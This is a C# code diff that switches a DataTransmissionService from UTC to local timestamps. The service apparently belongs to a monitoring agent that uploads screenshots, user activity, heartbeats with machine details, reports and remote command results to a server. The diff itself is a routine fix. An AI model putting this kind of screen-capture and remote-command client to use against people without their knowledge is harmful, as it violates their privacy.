@@ -272,10 +272,12 @@ public class DataTransmissionService : IDataTransmissionService
             using (var streamContent = GetEncryptedStreamContent(fileStream))
             using (var content = new MultipartFormDataContent())
             {
-                var sendName = $"{_settings.ClientId}_{DateTime.UtcNow:yyyy-MM-ddTHH-mm-ss.fffZ}.jpg";
+                var now = DateTime.Now;
+                var sendName = $"{_settings.ClientId}_{now:yyyy-MM-ddTHH-mm-ss.fff}.jpg";
                 content.Add(streamContent, "screenshot", sendName);
                 content.Add(new StringContent(_settings.ClientId), "clientId");
-                content.Add(new StringContent(DateTime.UtcNow.ToString("O")), "timestamp");
+                // Send Local Time exactly as is (no Z, no offset)
+                content.Add(new StringContent(now.ToString("yyyy-MM-ddTHH:mm:ss.fff")), "timestamp");
 
                 var response = await PostWithAutoDiscoverAsync("screenshots", content);
                 
@@ -349,14 +351,14 @@ public class DataTransmissionService : IDataTransmissionService
                         else
                         {
                             _logger.LogWarning("Failed to send system event batch. Status: {StatusCode}", response.StatusCode);
-                            var name = Path.Combine(_pendingEvents, $"batch_{DateTime.UtcNow:yyyyMMdd_HHmmss_fff}.json");
+                            var name = Path.Combine(_pendingEvents, $"batch_{DateTime.Now:yyyyMMdd_HHmmss_fff}.json");
                             try { await File.WriteAllTextAsync(name, json); } catch { }
                         }
                     }
                     catch (Exception ex)
                     {
                         _logger.LogError(ex, "Error sending system event batch");
-                        try { var name = Path.Combine(_pendingEvents, $"batch_{DateTime.UtcNow:yyyyMMdd_HHmmss_fff}.json"); await File.WriteAllTextAsync(name, JsonConvert.SerializeObject(batch)); } catch { }
+                        try { var name = Path.Combine(_pendingEvents, $"batch_{DateTime.Now:yyyyMMdd_HHmmss_fff}.json"); await File.WriteAllTextAsync(name, JsonConvert.SerializeObject(batch)); } catch { }
                     }
                 }
             }
@@ -374,7 +376,7 @@ public class DataTransmissionService : IDataTransmissionService
             var payload = new
             {
                 ClientId = _settings.ClientId,
-                Timestamp = DateTime.UtcNow,
+                Timestamp = DateTime.Now,
                 IsActive = isActive,
                 ActiveMilliseconds = activeMilliseconds,
                 InactiveMilliseconds = inactiveMilliseconds
@@ -397,7 +399,7 @@ public class DataTransmissionService : IDataTransmissionService
         catch (Exception ex)
         {
             _logger.LogError(ex, "Error sending activity");
-            try { var name = Path.Combine(_pendingActivity, DateTime.UtcNow.ToString("yyyyMMdd_HHmmss_fff") + ".json"); await File.WriteAllTextAsync(name, JsonConvert.SerializeObject(new { IsActive = isActive, ActiveMilliseconds = activeMilliseconds, InactiveMilliseconds = inactiveMilliseconds })); } catch { }
+            try { var name = Path.Combine(_pendingActivity, DateTime.Now.ToString("yyyyMMdd_HHmmss_fff") + ".json"); await File.WriteAllTextAsync(name, JsonConvert.SerializeObject(new { IsActive = isActive, ActiveMilliseconds = activeMilliseconds, InactiveMilliseconds = inactiveMilliseconds })); } catch { }
         }
     }
 
@@ -408,7 +410,7 @@ public class DataTransmissionService : IDataTransmissionService
             var heartbeat = new
             {
                 ClientId = _settings.ClientId,
-                Timestamp = DateTime.UtcNow,
+                Timestamp = DateTime.Now,
                 Status = "Online",
                 Version = "1.0.0",
                 Machine = Environment.MachineName,
@@ -436,13 +438,13 @@ public class DataTransmissionService : IDataTransmissionService
             else
             {
                 _logger.LogWarning("Failed to send heartbeat. Status: {StatusCode}", response.StatusCode);
-                try { var name = Path.Combine(_pendingHeartbeats, DateTime.UtcNow.ToString("yyyyMMdd_HHmmss_fff") + ".json"); await File.WriteAllTextAsync(name, json); } catch { }
+                try { var name = Path.Combine(_pendingHeartbeats, DateTime.Now.ToString("yyyyMMdd_HHmmss_fff") + ".json"); await File.WriteAllTextAsync(name, json); } catch { }
             }
         }
         catch (Exception ex)
         {
             _logger.LogError(ex, "Error sending heartbeat");
-            try { var name = Path.Combine(_pendingHeartbeats, DateTime.UtcNow.ToString("yyyyMMdd_HHmmss_fff") + ".json"); await File.WriteAllTextAsync(name, JsonConvert.SerializeObject(new { ClientId = _settings.ClientId, Timestamp = DateTime.UtcNow, Status = "Online", Version = "1.0.0", Machine = Environment.MachineName, OS = Environment.OSVersion.ToString() })); } catch { }
+            try { var name = Path.Combine(_pendingHeartbeats, DateTime.Now.ToString("yyyyMMdd_HHmmss_fff") + ".json"); await File.WriteAllTextAsync(name, JsonConvert.SerializeObject(new { ClientId = _settings.ClientId, Timestamp = DateTime.Now, Status = "Online", Version = "1.0.0", Machine = Environment.MachineName, OS = Environment.OSVersion.ToString() })); } catch { }
         }
     }
 
@@ -489,7 +491,7 @@ public class DataTransmissionService : IDataTransmissionService
             {
                 content.Add(streamContent, "report", Path.GetFileName(reportPath));
                 content.Add(new StringContent(_settings.ClientId), "clientId");
-                content.Add(new StringContent(DateTime.UtcNow.ToString("O")), "timestamp");
+                content.Add(new StringContent(DateTime.Now.ToString("yyyy-MM-ddTHH:mm:ss.fff")), "timestamp");
 
                 var response = await PostWithAutoDiscoverAsync("reports", content);
                 
@@ -799,7 +801,7 @@ public class DataTransmissionService : IDataTransmissionService
                     {
                         content.Add(streamContent, "report", Path.GetFileName(file));
                         content.Add(new StringContent(_settings.ClientId), "clientId");
-                        content.Add(new StringContent(DateTime.UtcNow.ToString("O")), "timestamp");
+                        content.Add(new StringContent(DateTime.Now.ToString("yyyy-MM-ddTHH:mm:ss.fff")), "timestamp");
                         var resp = await PostWithAutoDiscoverAsync("reports", content);
                         
                         if (resp.IsSuccessStatusCode) 
@@ -896,7 +898,7 @@ public class DataTransmissionService : IDataTransmissionService
                         {
                             content.Add(streamContent, "file", Path.GetFileName(file));
                             content.Add(new StringContent(_settings.ClientId), "clientId");
-                            content.Add(new StringContent(DateTime.UtcNow.ToString("O")), "timestamp");
+                            content.Add(new StringContent(DateTime.Now.ToString("yyyy-MM-ddTHH:mm:ss.fff")), "timestamp");
                             var resp = await PostWithAutoDiscoverAsync($"commands/{cmdId}/result", content);
                             if (resp.IsSuccessStatusCode) 
                             {
@@ -942,10 +944,13 @@ public class DataTransmissionService : IDataTransmissionService
             if (parts.Length >= 3)
             {
                 var ts = parts[^1];
-                if (DateTime.TryParseExact(ts, "yyyyMMdd_HHmmss", System.Globalization.CultureInfo.InvariantCulture, System.Globalization.DateTimeStyles.None, out var local))
+                // Try parsing the format we actually use: yyyy-MM-ddTHH-mm-ss.fff
+                // Also support legacy format just in case
+                if (DateTime.TryParseExact(ts, "yyyy-MM-ddTHH-mm-ss.fff", System.Globalization.CultureInfo.InvariantCulture, System.Globalization.DateTimeStyles.None, out var local) ||
+                    DateTime.TryParseExact(ts, "yyyyMMdd_HHmmss", System.Globalization.CultureInfo.InvariantCulture, System.Globalization.DateTimeStyles.None, out local))
                 {
-                    if (local.Kind == DateTimeKind.Unspecified) local = DateTime.SpecifyKind(local, DateTimeKind.Local);
-                    return local.ToUniversalTime();
+                    // Return as is (Unspecified/Local) so it prints cleanly
+                    return local;
                 }
             }
         }
